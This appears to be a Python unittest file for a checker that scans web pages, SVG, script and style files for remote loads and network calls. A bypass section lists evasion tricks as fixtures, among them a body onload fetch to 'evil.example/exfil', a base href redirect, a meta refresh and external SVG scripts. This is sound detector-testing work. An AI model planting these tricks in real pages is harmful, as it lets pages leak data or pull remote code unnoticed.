"""Tests for tools/check_made.py. Run with: python3 -m unittest discover -s tools"""
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import check_made as cm  # noqa: E402


def write(root: Path, rel: str, text: str) -> None:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")


class ScanTests(unittest.TestCase):
    def scan(self, html: str) -> list[str]:
        root = Path(tempfile.mkdtemp())
        write(root, "page.html", html)
        return [kind for _, kind, _ in cm.scan_html(root / "page.html")]

    def test_clean_page_has_no_problems(self):
        self.assertEqual(self.scan("<script>var x = 1; // fetch the next frame\n</script>"), [])

    def test_prose_mentioning_fetch_is_not_flagged(self):
        self.assertEqual(self.scan("<p>We fetch nothing. XMLHttpRequest is a word.</p>"), [])

    def test_remote_src_and_link(self):
        kinds = self.scan('<link rel="stylesheet" href="https://a.b/x.css">'
                          '<script src="//cdn.a.b/l.js"></script>')
        self.assertEqual(sorted(kinds), ["<link href>", "src"])

    def test_local_src_and_data_uri_are_fine(self):
        self.assertEqual(self.scan('<img src="data:image/png;base64,AAAA"><script src="./l.js"></script>'), [])

    def test_srcset_object_poster(self):
        kinds = self.scan('<img srcset="a.png 1x, https://a.b/c.png 2x">'
                          '<object data="https://a.b/o.svg"></object>'
                          '<video poster="//a.b/p.jpg"></video>')
        self.assertEqual(sorted(kinds), ["data", "poster", "srcset"])

    def test_css_import_and_url(self):
        kinds = self.scan('<style>@import url("https://f.a/x.css"); body{background:url(//i.a/b.png)}</style>')
        self.assertEqual(sorted(kinds), ["@import", "url()"])

    def test_network_calls(self):
        kinds = self.scan("<script>fetch('/x'); new WebSocket('wss://a.b'); new EventSource('/e');"
                          " navigator.sendBeacon('/b'); import('https://a.b/m.js');</script>")
        self.assertEqual(kinds.count("network call"), 5)
        self.assertIn("url in script string", kinds)

    def test_url_in_script_string(self):
        kinds = self.scan("<script>var api = 'https://api.example.com/v1';</script>")
        self.assertEqual(kinds, ["url in script string"])

    def test_outbound_anchor_links_are_allowed(self):
        self.assertEqual(self.scan('<a href="https://example.com">Reading</a>'), [])

    def test_unquoted_and_entity_encoded_src(self):
        self.assertEqual(self.scan("<script src=https://example.com/x.js></script>"), ["src"])
        self.assertEqual(self.scan('<script src="https&#58;//example.com/x.js"></script>'), ["src"])

    def test_inline_style_attribute(self):
        self.assertEqual(self.scan('<div style="background:url(https://a.b/x.png)"></div>'), ["url()"])


class IndexTests(unittest.TestCase):
    def test_hidden_ancestor_does_not_skip_everything(self):
        base = Path(tempfile.mkdtemp())
        root = base / ".checkout"
        write(root, "made/README.md", "")
        write(root, "made/bad.html", '<script src="https://example.com/x.js"></script>')
        self.assertEqual(cm.list_items(root / "made"), ["bad.html"])
        import contextlib, io
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            self.assertEqual(cm.check(root), 1)
        # Changed 2026-10-04 with the bypass fix: the tally now counts .svg,
        # .js and .css as well as pages, so the word is "file(s)". Only the
        # noun changed; the count and the assertion's intent are the same.
        self.assertIn("1 file(s) checked, 2 problem(s)", out.getvalue())

    def test_hidden_files_inside_made_are_skipped(self):
        root = Path(tempfile.mkdtemp())
        write(root, "made/.draft/x.html", "<p>x</p>")
        write(root, "made/ok.html", "<p>x</p>")
        self.assertEqual(cm.list_items(root / "made"), ["ok.html"])

    def test_exact_name_match_not_substring(self):
        names = cm.index_names("- `data.py` does things; see [notes](docs/notes.md)")
        self.assertEqual(names, {"data.py", "docs/notes.md"})
        self.assertNotIn("a.py", names)

    def test_check_reports_missing_and_stale(self):
        root = Path(tempfile.mkdtemp())
        write(root, "made/README.md", "- `one.html` here\n- `gone.html` was here\n- [two](sub/two.html)\n")
        write(root, "made/one.html", "<p>ok</p>")
        write(root, "made/sub/two.html", "<p>ok</p>")
        write(root, "made/three.py", "print(1)\n")
        import contextlib
        import io
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            status = cm.check(root)
        text = out.getvalue()
        self.assertEqual(status, 1)
        self.assertIn("sub/two.html", text)
        self.assertIn("missing from made/README.md: three.py", text)
        self.assertIn("named in made/README.md but absent: gone.html", text)
        self.assertIn("2 problem(s)", text)


if __name__ == "__main__":
    unittest.main()


class BypassTests(unittest.TestCase):
    """Four ways a page reached the network while this checker said "ok".

    Found 2026-10-04 by asking the question that matters about any detector
    with an unbroken record: not "does it catch what it catches", but "what
    has it never been shown to catch". Each test below failed before the fix
    in the same commit. The first three are markup the browser acts on and
    the scanner did not read; the fourth is a whole class of file it never
    opened.
    """

    def scan(self, html: str) -> list[str]:
        root = Path(tempfile.mkdtemp())
        write(root, "page.html", html)
        return [kind for _, kind, _ in cm.scan_markup(root / "page.html")]

    def test_base_href_relocates_every_relative_url(self):
        # The page below has one relative <img>. With this <base> the browser
        # fetches it from evil.example. Nothing else on the page looks remote.
        kinds = self.scan('<base href="https://evil.example/"><img src="pic.png">')
        self.assertIn("<base href>", kinds)

    def test_local_base_href_is_fine(self):
        self.assertEqual(self.scan('<base href="./assets/"><img src="pic.png">'), [])

    def test_meta_refresh_to_remote_url(self):
        kinds = self.scan('<meta http-equiv="refresh" content="0; url=https://evil.example/">')
        self.assertIn("<meta refresh>", kinds)

    def test_meta_refresh_local_or_plain_delay_is_fine(self):
        self.assertEqual(self.scan('<meta http-equiv="refresh" content="30">'), [])
        self.assertEqual(self.scan('<meta http-equiv="refresh" content="0; url=next.html">'), [])
        self.assertEqual(self.scan('<meta name="description" content="url=https://a.b/">'), [])

    def test_inline_event_handler_is_script(self):
        kinds = self.scan("""<body onload="fetch('https://evil.example/exfil')">x</body>""")
        self.assertIn("network call", kinds)

    def test_inline_handler_without_network_is_fine(self):
        self.assertEqual(self.scan('<button onclick="count += 1">+</button>'), [])

    def test_standalone_script_file_is_scanned(self):
        root = Path(tempfile.mkdtemp())
        write(root, "mod.js", 'fetch("https://evil.example/from-a-js-file");\n')
        kinds = [kind for _, kind, _ in cm.scan_file(root / "mod.js")]
        self.assertIn("network call", kinds)

    def test_standalone_style_file_is_scanned(self):
        root = Path(tempfile.mkdtemp())
        write(root, "s.css", '@import url(https://evil.example/f.css);\n')
        kinds = [kind for _, kind, _ in cm.scan_file(root / "s.css")]
        self.assertIn("@import", kinds)

    def test_svg_is_markup_and_is_scanned(self):
        root = Path(tempfile.mkdtemp())
        write(root, "d.svg", '<svg xmlns="http://www.w3.org/2000/svg">'
                             '<image href="https://evil.example/p.png"/></svg>')
        kinds = [kind for _, kind, _ in cm.scan_file(root / "d.svg")]
        self.assertIn("<image href>", kinds)

    def test_svg_xlink_href_and_external_script(self):
        root = Path(tempfile.mkdtemp())
        write(root, "d.svg", '<svg xmlns="http://www.w3.org/2000/svg">'
                             '<use xlink:href="https://evil.example/s.svg#i"/>'
                             '<script href="https://evil.example/s.js"/></svg>')
        kinds = [kind for _, kind, _ in cm.scan_file(root / "d.svg")]
        self.assertIn("<use href>", kinds)
        self.assertIn("<script href>", kinds)

    def test_svg_local_refs_and_anchors_are_fine(self):
        root = Path(tempfile.mkdtemp())
        write(root, "d.svg", '<svg xmlns="http://www.w3.org/2000/svg">'
                             '<use href="#icon"/><image href="./p.png"/>'
                             '<a href="https://example.com/">link</a></svg>')
        self.assertEqual(cm.scan_file(root / "d.svg"), [])

    def test_check_now_counts_svg_js_css_as_checked(self):
        root = Path(tempfile.mkdtemp())
        write(root, "made/README.md", "- `a.html`\n- `b.svg`\n- `c.js`\n- `d.css`\n")
        write(root, "made/a.html", "<p>ok</p>")
        write(root, "made/b.svg", '<svg xmlns="http://www.w3.org/2000/svg"></svg>')
        write(root, "made/c.js", "var x = 1;\n")
        write(root, "made/d.css", "body { color: red; }\n")
        self.assertEqual(cm.check(root), 0)
        names = [n for n in cm.list_items(root / "made")]
        scannable = [n for n in names if n.endswith(cm.MARKUP_EXT + cm.SCRIPT_EXT + cm.STYLE_EXT)]
        self.assertEqual(len(scannable), 4)
